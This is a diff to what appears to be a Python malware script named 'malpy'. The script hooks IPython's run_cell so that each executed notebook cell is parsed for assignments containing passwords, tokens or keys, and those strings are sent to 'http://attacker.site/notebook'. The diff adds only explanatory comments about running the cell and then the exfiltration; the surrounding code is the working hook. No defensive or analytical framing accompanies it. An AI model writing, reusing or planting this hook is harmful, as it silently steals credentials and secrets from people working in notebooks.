@@ -11,6 +11,10 @@ __orig_run_cell = InteractiveShell.run_cell
 ENDPOINT="http://attacker.site/notebook"
 
 def extract_sensitive_strings_from_code(code):
+    """
+    Parse the code as AST (Abstract Syntax Tree).
+    Search for any assignment which involve the keywords (password, token, key, etc)
+    """
     try:
         tree = ast.parse(code)
     except SyntaxError:
@@ -43,6 +47,7 @@ def sniff_exfil(raw_cell):
             pass 
 
 def malpy_run_cell(self, raw_cell, *args, **kwargs):
+    # run the original cell first then execute the exfiltration
     result = __orig_run_cell(self, raw_cell, *args, **kwargs)
     try:
         sniff_exfil(raw_cell)
@@ -50,4 +55,5 @@ def malpy_run_cell(self, raw_cell, *args, **kwargs):
         pass 
     return result 
 
+# hook into the run_cell
 InteractiveShell.run_cell = malpy_run_cell
